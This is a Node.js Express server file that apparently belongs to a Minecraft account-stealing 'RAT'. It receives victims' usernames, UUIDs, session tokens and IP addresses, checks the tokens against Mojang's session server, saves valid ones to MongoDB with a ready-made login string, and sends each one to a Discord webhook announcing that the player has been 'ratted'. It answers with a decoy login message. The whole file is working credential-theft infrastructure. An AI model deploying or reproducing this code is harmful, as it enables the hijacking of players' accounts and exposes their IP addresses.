//config params
const
    usingDiscord = true,
    usingMongoDB = true

//setup
require('dotenv').config()
const { post } = require("axios").default,
    express = require("express"),
    mongoose = require("mongoose"),
    helmet = require("helmet"),
    app = express(),
    Ratted = require("./models/Ratted"),
    port = process.env.PORT || 80

//plugins
app.use(helmet()) //secure
app.use(express.json()) //parse json
app.use(express.urlencoded({ extended: true }))

//database connection
if (usingMongoDB) {
    mongoose.connect(process.env.DB)
    mongoose.connection.on("connected", () => console.log("Mongoose connection successfully opened!"))
    mongoose.connection.on("err", err => console.error(`Mongoose connection error:\n${err.stack}`))
    mongoose.connection.on("disconnected", () => console.log("Mongoose connection disconnected"))
}

//main route, post to this
app.post("/", (req, res) => {
    //happens if the request does not contain all the required fields, aka someones manually posting to the server
    if (!req.body.username || !req.body.uuid || !req.body.token || !req.body.ip) return console.log("Invalid post request")

    //validate the token with mojang (should mostly always hit, unless someone sends well formatted json but with bad data)
    post("https://sessionserver.mojang.com/session/minecraft/join", JSON.stringify({
        accessToken: req.body.token,
        selectedProfile: req.body.uuid,
        serverId: req.body.uuid
    }), {
        headers: {
            'Content-Type': 'application/json'
        }
    })

    .then(response => {
        if (response.status == 204) { //mojangs way of saying its good
            if (usingMongoDB) {
                //create a Ratted object with mongoose schema and save it
                new Ratted({
                    username: req.body.username,
                    uuid: req.body.uuid,
                    token: req.body.token,
                    ip: req.body.ip,
                    timestamp: new Date(),

                    //(optional) string to login using https://github.com/DxxxxY/TokenAuth
                    tokenAuth: `${req.body.username}:${req.body.uuid}:${req.body.token}`
                }).save(err => {
                    if (err) console.log(`Error while saving to database\n${err}`)
                })
            }

            if (usingDiscord) {
                //send to discord webhook
                post(process.env.WEBHOOK, JSON.stringify({
                    content: "@everyone", //ping
                    embeds: [{
                        title: `Ratted ${req.body.username} - Click For Stats`,
                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\``,
                        url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                        color: 5814783,
                        footer: {
                            "text": "R.A.T by dxxxxy",
                            "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
                        },
                        timestamp: new Date()
                    }],
                    attachments: []
                }), {
                    headers: {
                        'Content-Type': 'application/json'
                    }
                }).catch(err => {
                    console.log(`Error while sending to webhook\n${err}`)
                })
            }

            console.log(`${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
        }
    })

    .catch(err => {
        //could happen if the auth server is down OR if invalid information is passed in the body
        console.log(`Error checking data with mojang\n${err}`)
    })

    //change this to whatever u want, but make sure to send a response
    res.send("Logged in to SBE server")
})

//create server
app.listen(port, () => console.log(`Listening at port ${port}`))